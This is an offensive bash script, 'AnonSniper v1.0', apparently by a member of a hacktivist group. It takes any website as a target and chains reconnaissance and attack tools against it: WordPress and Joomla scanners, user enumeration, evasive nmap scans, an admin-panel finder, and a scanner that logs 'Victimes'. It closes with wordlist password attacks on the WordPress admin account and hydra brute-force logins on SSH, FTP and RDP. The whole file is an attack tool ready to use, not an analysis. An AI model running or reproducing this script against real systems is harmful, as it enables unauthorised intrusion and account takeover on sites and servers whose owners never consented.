#!/bin/bash
#Coded by w0lgix (mhmad msarwe)
#https://www.facebook.com/Officiel.mhmad
#mhmad.msarwe@yahoo.com
#anonghost team and x-sec-team

OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'
clear
echo "###################################################"
echo "#https://www.facebook.com/Officiel.mhmad          #"
echo "#                                                 #"
echo "# ░░░░░░███████ ]▄▄▄▄▄▄▄▄                         #"
echo "#▂▄▅█████████▅▄▃▂                                 #"
echo "#I███████████████████].                           #"
echo "#◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤...                               #"
echo "#                 Coded By w0lgix                 #"
echo "#   AnonSniper    v1.0                            #"
echo "#                                                 #"
echo "#            Using ./w0lgix1.sh                   #"
echo "###################################################"


echo -e "enter website"
read web
echo -e "\n1)wordpress\n2)joomla\n3)normal"
read num
echo -e "enter your path"
echo -e "example /home/parrot/Desktop/"
read path

case $num in

	1)

php waf-detector/wafdetector.php http://$web
wait
cd wpscan
	ruby wpscan.rb -u http://$web/ --enumerate p --random-agent
	wait
	ruby wpscan.rb -u http://$web/ --enumerate u --random-agent
	wait
cd ..
	ruby wpscan/wpscan.rb  -u http://$web/ --wordlist password/pwd.txt --username admin --random-agent
	wait

cd WhatWeb

	chmod 755 whatweb

	./whatweb $web	
wait
cd ..
mkdir rezult

	python theHarvester/theHarvester.py -d $web -b all -f rezult/theharvester.html
wait
cd fierce-domain-scanner
	perl fierce.pl -dns $web -thread 10 -file dns.txt


mv dns.txt $path/w0lgix/rezult/dns.txt

wait
cd ..
	nmap -sV -sS -O -A -f -Pn -PN $web > rezult/nmap.txt
wait
	nmap -sS -PS80,81,443,8080,8081 -p80,81,443,8080,8081 --script=http-git $web > rezult/nmap-git.txt

;;
#------------------------------------------------------------------------------------------------------------------------------------
	2)

	perl joomscan-owasp/joomscan.pl -u $web -oh rezult/joomscan.html
wait
	php waf-detector/wafdetector.php http://$web
	dig $web
;; 
#------------------------------------------------------------------------------------------------------------------------------------
	3)

php waf-detector/wafdetector.php http://$web
wait
sslscan $web

	cd WhatWeb

	chmod 755 whatweb

	./whatweb $web	
wait
cd ..
mkdir rezult

	python theHarvester/theHarvester.py -d $web -b all -f rezult/theharvester.html
wait
cd fierce-domain-scanner
	perl fierce.pl -dns $web -thread 10 -file dns.txt


mv dns.txt $path/w0lgix/rezult/dns.txt

wait
cd ..
	nmap -sV -sS -O -A -f -Pn -PN $web > rezult/nmap.txt
wait
	nmap -sS -PS80,81,443,8080,8081 -p80,81,443,8080,8081 --script=http-git $web > rezult/nmap-git.txt
wait
	ruby URLCrazy/urlcrazy $web
wait
	php admin.php http://www.$web/
wait


	host $web | grep "has address" | cut -d" " -f 4 > hosts.txt

url=`cat hosts.txt`

for ip in $url
do
	ruby BlackScanner.rb $ip id
	mv Victimes.txt $path/w0lgix/rezult/Victimes.txt
	mv hosts.txt $path/w0lgix/rezult/hosts.txt

done

wait
	hydra -L password/users.txt -P password/ssh_passwd.txt ssh://$ip -vV 
wait
	hydra -L password/users.txt -P password/passlist.txt ftp://$ip -vV 
wait
	hydra -t 4 -V -l Administrator -P password/rdp_passlist.txt rdp://$ip 


mv hydra.restore $path/w0lgix/rezult
dig $web
;;
    *)
        echo "Chose 1 - 3!!"
        
esac
